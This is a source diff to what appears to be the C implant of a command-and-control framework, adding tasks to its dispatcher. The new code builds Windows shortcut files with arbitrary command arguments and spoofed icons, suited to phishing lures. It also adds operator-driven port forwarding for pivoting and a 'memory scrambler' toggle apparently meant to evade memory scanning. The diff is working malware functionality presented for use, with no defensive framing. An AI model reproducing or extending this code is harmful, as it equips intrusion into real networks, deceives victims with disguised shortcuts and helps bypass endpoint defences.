@@ -9,6 +9,7 @@
 #include "http_pivot.h"
 #include "tcp_pivot.h"
 #include "pipe_server.h"
+#include "portfwd.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -1095,6 +1096,92 @@ static void smb_stage_cleanup(const char *host, const char *user) {
         system(cmd);
     }
 }
+
+// ── GEN_LNK helper ────────────────────────────────────────────────────────────
+
+#ifdef _WIN32
+static void lnk_u16le(FILE *f, uint16_t v) { fwrite(&v, 2, 1, f); }
+static void lnk_u32le(FILE *f, uint32_t v) { fwrite(&v, 4, 1, f); }
+static void lnk_zeros(FILE *f, int n)       { uint8_t z=0; for(int i=0;i<n;i++) fwrite(&z,1,1,f); }
+
+static void lnk_unicode_str(FILE *f, const char *s) {
+    wchar_t wbuf[2048] = {0};
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, s, -1, wbuf, 2048);
+    if (wlen > 0) wlen--; /* strip null terminator */
+    lnk_u16le(f, (uint16_t)wlen);
+    for (int i = 0; i < wlen; i++) lnk_u16le(f, (uint16_t)wbuf[i]);
+}
+
+static char *gen_lnk(const char *target, const char *lnk_args,
+                     const char *working_dir, const char *icon_path,
+                     int icon_index, const char *outfile) {
+    static char msg[512];
+    FILE *f = fopen(outfile, "wb");
+    if (!f) {
+        snprintf(msg, sizeof(msg), "[-] gen_lnk: fopen failed: %s", outfile);
+        return msg;
+    }
+    /* ShellLinkHeader (0x4C = 76 bytes) */
+    lnk_u32le(f, 0x0000004C);   /* HeaderSize */
+    /* LinkCLSID: 00021401-0000-0000-C000-000000000046 */
+    static const uint8_t guid[16] = {
+        0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
+        0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46};
+    fwrite(guid, 1, 16, f);
+    /* LinkFlags */
+    uint32_t flags = 0x00000004  /* HasName */
+                   | 0x00000008  /* HasRelPath */
+                   | 0x00000010  /* HasWorkingDir */
+                   | 0x00000020  /* HasArguments */
+                   | 0x00000040  /* HasIconLocation */
+                   | 0x00000080; /* IsUnicode */
+    lnk_u32le(f, flags);
+    lnk_u32le(f, 0x20);         /* FileAttributes: FILE_ATTRIBUTE_ARCHIVE */
+    lnk_zeros(f, 8);            /* CreationTime */
+    lnk_zeros(f, 8);            /* AccessTime */
+    lnk_zeros(f, 8);            /* WriteTime */
+    lnk_u32le(f, 0);            /* FileSize */
+    lnk_u32le(f, (uint32_t)icon_index); /* IconIndex */
+    lnk_u32le(f, 0x00000001);   /* ShowCommand: SW_NORMAL */
+    lnk_u16le(f, 0);            /* HotKey */
+    lnk_zeros(f, 10);           /* Reserved */
+    /* StringData: NAME_STRING */
+    char name[256] = {0};
+    const char *bn = strrchr(target, '\\');
+    if (!bn) bn = strrchr(target, '/');
+    if (bn) bn++; else bn = target;
+    strncpy(name, bn, sizeof(name)-1);
+    char *dot = strrchr(name, '.'); if (dot) *dot = '\0';
+    lnk_unicode_str(f, name);
+    /* RELATIVE_PATH */
+    lnk_unicode_str(f, ".");
+    /* WORKING_DIR */
+    char wd[512] = {0};
+    if (working_dir && working_dir[0]) {
+        strncpy(wd, working_dir, sizeof(wd)-1);
+    } else {
+        strncpy(wd, target, sizeof(wd)-1);
+        char *last = strrchr(wd, '\\');
+        if (!last) last = strrchr(wd, '/');
+        if (last) *last = '\0'; else strncpy(wd, ".", sizeof(wd)-1);
+    }
+    lnk_unicode_str(f, wd);
+    /* COMMAND_LINE_ARGUMENTS: target + space + args */
+    char cmd_args[1024] = {0};
+    if (lnk_args && lnk_args[0])
+        snprintf(cmd_args, sizeof(cmd_args), "%s %s", target, lnk_args);
+    else
+        strncpy(cmd_args, target, sizeof(cmd_args)-1);
+    lnk_unicode_str(f, cmd_args);
+    /* ICON_LOCATION */
+    lnk_unicode_str(f, (icon_path && icon_path[0]) ? icon_path : target);
+    long sz = ftell(f);
+    fclose(f);
+    snprintf(msg, sizeof(msg), "[+] gen_lnk: %s -> %s (%ld bytes)",
+             outfile, target, sz);
+    return msg;
+}
+#endif /* _WIN32 */
 
 // ── Dispatcher ────────────────────────────────────────────────────────────────
 
@@ -3312,10 +3399,73 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out ? out : "[-] pipe_server_stop failed", "");
         free(out);
     }
-    else if (strcmp(type_upper, "PORTFWD_ADD") == 0 ||
-             strcmp(type_upper, "PORTFWD_DEL") == 0 ||
-             strcmp(type_upper, "PORTFWD_LIST") == 0) {
-        agent_send_result(task->id, "", "PORTFWD: not yet implemented in C agent");
+    else if (strcmp(type_upper, "PORTFWD_LIST") == 0) {
+        agent_send_result(task->id, portfwd_list(), "");
+    }
+    else if (strcmp(type_upper, "PORTFWD_ADD") == 0) {
+        /* Args: "[tcp|udp] <lport> <rhost> <rport>" */
+        char proto[8]="tcp", lhost[256]="", rportStr[8]="";
+        int lport=0, rport=0;
+        /* tokenize args */
+        char argbuf[512]; strncpy(argbuf, args, sizeof(argbuf)-1);
+        char *tok = strtok(argbuf, " \t");
+        if (tok && (strcmp(tok,"tcp")==0 || strcmp(tok,"udp")==0)) {
+            strncpy(proto, tok, sizeof(proto)-1); tok = strtok(NULL," \t");
+        }
+        if (tok) { lport = atoi(tok); tok = strtok(NULL," \t"); }
+        if (tok) { strncpy(lhost, tok, sizeof(lhost)-1); tok = strtok(NULL," \t"); }
+        if (tok) { rport = atoi(tok); }
+        if (!lport || !lhost[0] || !rport) {
+            agent_send_result(task->id,"","usage: [tcp|udp] <lport> <rhost> <rport>"); return;
+        }
+        agent_send_result(task->id, portfwd_add(proto, lport, lhost, rport), "");
+    }
+    else if (strcmp(type_upper, "PORTFWD_DEL") == 0) {
+        /* Args: "[tcp|udp] <lport>" */
+        char proto[8]="tcp"; int lport=0;
+        char argbuf[128]; strncpy(argbuf, args, sizeof(argbuf)-1);
+        char *tok = strtok(argbuf, " \t");
+        if (tok && (strcmp(tok,"tcp")==0 || strcmp(tok,"udp")==0)) {
+            strncpy(proto, tok, sizeof(proto)-1); tok = strtok(NULL," \t");
+        }
+        if (tok) lport = atoi(tok);
+        if (!lport) { agent_send_result(task->id,"","usage: [tcp|udp] <lport>"); return; }
+        agent_send_result(task->id, portfwd_del(proto, lport), "");
+    }
+    else if (strcmp(type_upper, "MEM_FLUCTUATE") == 0) {
+        char argbuf[64]; strncpy(argbuf, args, sizeof(argbuf)-1);
+        char *tok = strtok(argbuf, " \t");
+        if (!tok || strcmp(tok, "stop") == 0) {
+            mem_fluctuate_stop();
+            agent_send_result(task->id, "[+] memory scrambler stopped", "");
+        } else {
+            int interval = 10;
+            tok = strtok(NULL, " \t");
+            if (tok) interval = atoi(tok);
+            if (interval <= 0) interval = 10;
+            mem_fluctuate_start(interval);
+            char msg[64];
+            snprintf(msg, sizeof(msg), "[+] memory scrambler started (interval %ds)", interval);
+            agent_send_result(task->id, msg, "");
+        }
+    }
+    else if (strcmp(type_upper, "GEN_LNK") == 0) {
+#ifdef _WIN32
+        char target[512]="", lnk_args[512]="", working_dir[512]="";
+        char icon_path[512]="", outfile[512]="";
+        json_get_str(args,"target",target,sizeof(target),"");
+        json_get_str(args,"args",lnk_args,sizeof(lnk_args),"");
+        json_get_str(args,"working_dir",working_dir,sizeof(working_dir),"");
+        json_get_str(args,"icon_path",icon_path,sizeof(icon_path),"");
+        json_get_str(args,"outfile",outfile,sizeof(outfile),"");
+        int icon_index = json_get_int(args,"icon_index",0);
+        if (!target[0] || !outfile[0]) {
+            agent_send_result(task->id,"","GEN_LNK: {target,outfile} required"); return;
+        }
+        agent_send_result(task->id, gen_lnk(target,lnk_args,working_dir,icon_path,icon_index,outfile), "");
+#else
+        agent_send_result(task->id,"","GEN_LNK: Windows only");
+#endif
     }
     else if (strcmp(type_upper, "BOF_STORE_LOAD") == 0 ||
              strcmp(type_upper, "BOF_STORE_LIST") == 0 ||
